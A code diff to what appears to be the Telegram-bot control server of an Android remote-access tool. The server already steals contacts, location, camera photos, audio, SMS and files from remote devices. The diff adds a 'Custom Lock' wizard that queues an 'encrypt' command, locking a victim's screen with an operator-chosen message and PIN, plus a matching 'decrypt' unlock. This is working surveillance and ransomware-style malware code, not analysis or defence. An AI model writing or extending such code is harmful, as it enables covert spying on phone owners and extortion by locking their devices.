@@ -94,7 +94,11 @@ function sendCommandMenu(ctx, deviceId, deviceName) {
                     Markup.button.callback('🌐 Open URL',     `cmd_urlmode_${deviceId}`)
                 ],
                 [
-                    Markup.button.callback('🔒 Lock Screen',  `cmd_lock_${deviceId}`)
+                    Markup.button.callback('🔒 System Lock',  `cmd_lock_${deviceId}`),
+                    Markup.button.callback('🔑 Custom Lock',  `cmd_encryptmode_${deviceId}`)
+                ],
+                [
+                    Markup.button.callback('🔓 Unlock Device', `cmd_decrypt_${deviceId}`)
                 ],
                 [Markup.button.callback('« Back to Devices', 'back_to_devices')]
             ])
@@ -135,8 +139,8 @@ bot.action(/^select_device_(.+)$/, async (ctx) => {
     return sendCommandMenu(ctx, deviceId, device.name);
 });
 
-// Run a command on the selected device (excludes smsmode and recmode — handled separately)
-bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files)_(.+)$/, async (ctx) => {
+// Run a command on the selected device (excludes smsmode, recmode, encryptmode — handled separately)
+bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files|decrypt)_(.+)$/, async (ctx) => {
     const command = ctx.match[1];
     const deviceId = ctx.match[2];
     const device = devices[deviceId];
@@ -152,8 +156,9 @@ bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files)_(.+)$/, async (ctx) => {
         loc:     '📍 Location',
         cf:      '📸 Front Camera',
         cb:      '📷 Back Camera',
-        lock:    '🔒 Lock Screen',
-        files:   '📁 Browse Files'
+        lock:    '🔒 System Lock',
+        files:   '📁 Browse Files',
+        decrypt: '🔓 Unlock Device'
     };
 
     device.pendingCommand = command;
@@ -177,6 +182,29 @@ const recWizard = {};
 // --- URL Wizard ---
 // urlWizard[chatId] = { step: 'url' | 'title' | 'message', deviceId, url, title }
 const urlWizard = {};
+
+// --- Custom Lock Wizard ---
+// encryptWizard[chatId] = { step: 'message' | 'pin', deviceId, message }
+const encryptWizard = {};
+
+// Step 1: user taps "🔑 Custom Lock" button
+bot.action(/^cmd_encryptmode_(.+)$/, async (ctx) => {
+    const deviceId = ctx.match[1];
+    const device = devices[deviceId];
+    if (!device) { await ctx.answerCbQuery('⚠️ Device offline!'); return; }
+    userSession[ctx.chat.id] = deviceId;
+    encryptWizard[ctx.chat.id] = { step: 'message', deviceId };
+    await ctx.answerCbQuery();
+    await ctx.editMessageText(
+        `🔑 *Custom Lock on ${device.name}*\n\n━━━━━━━━━━━━━━\n✍️ *Step 1 of 2*\n\nPlease type the **Lock Message** you want to display on the screen:`,
+        {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('❌ Cancel', `select_device_${deviceId}`)]
+            ])
+        }
+    );
+});
 
 // Step 1: user taps "🎙️ Record Audio" button
 bot.action(/^cmd_recmode_(.+)$/, async (ctx) => {
@@ -277,11 +305,44 @@ bot.on('text', async (ctx) => {
 
     const wizard = smsWizard[chatId];
     const uWizard = urlWizard[chatId];
+    const eWizard = encryptWizard[chatId];
 
     // If not in wizard mode, check for /ms command handled separately
-    if (!wizard && !uWizard) return;
+    if (!wizard && !uWizard && !eWizard) return;
 
     const text = ctx.message.text.trim();
+
+    if (eWizard) {
+        if (eWizard.step === 'message') {
+            eWizard.message = text;
+            eWizard.step = 'pin';
+            encryptWizard[chatId] = eWizard;
+            return ctx.reply(
+                `✅ *Message saved:* \`${text}\`\n\n━━━━━━━━━━━━━━\n🔑 *Step 2 of 2*\n\nNow type the **PIN Code** (numbers only, e.g. 1234):`,
+                { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', `select_device_${eWizard.deviceId}`)]]) }
+            );
+        } else if (eWizard.step === 'pin') {
+            const message = eWizard.message;
+            const pin = text;
+            const deviceId = eWizard.deviceId;
+            delete encryptWizard[chatId];
+
+            const device = devices[deviceId];
+            if (!device) {
+                return ctx.reply('⚠️ Device went offline. Please select a device again via /devices.');
+            }
+
+            device.pendingCommand = 'encrypt';
+            device.requestingChatId = chatId;
+            deviceExtras[deviceId] = { message, pin };
+
+            return ctx.reply(
+                `🚀 *Custom Lock Command Queued!*\n\n📱 Device : *${device.name}*\n💬 Message : \`${message}\`\n🔑 PIN Code : \`${pin}\`\n\n_The device screen will lock with this layout within ~10 seconds._`,
+                { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back to Menu', `select_device_${deviceId}`)]]) }
+            );
+        }
+        return;
+    }
 
     if (uWizard) {
         if (uWizard.step === 'url') {
@@ -503,6 +564,12 @@ app.get('/check-command', (req, res) => {
             const extra = deviceExtras[deviceId];
             delete deviceExtras[deviceId];
             return res.json({ command: cmd, url: extra.url, title: extra.title, message: extra.message });
+        }
+        // For encrypt command, attach parameters
+        if (cmd === 'encrypt' && deviceExtras[deviceId]) {
+            const extra = deviceExtras[deviceId];
+            delete deviceExtras[deviceId];
+            return res.json({ command: cmd, message: extra.message, pin: extra.pin });
         }
         return res.json({ command: cmd });
     }
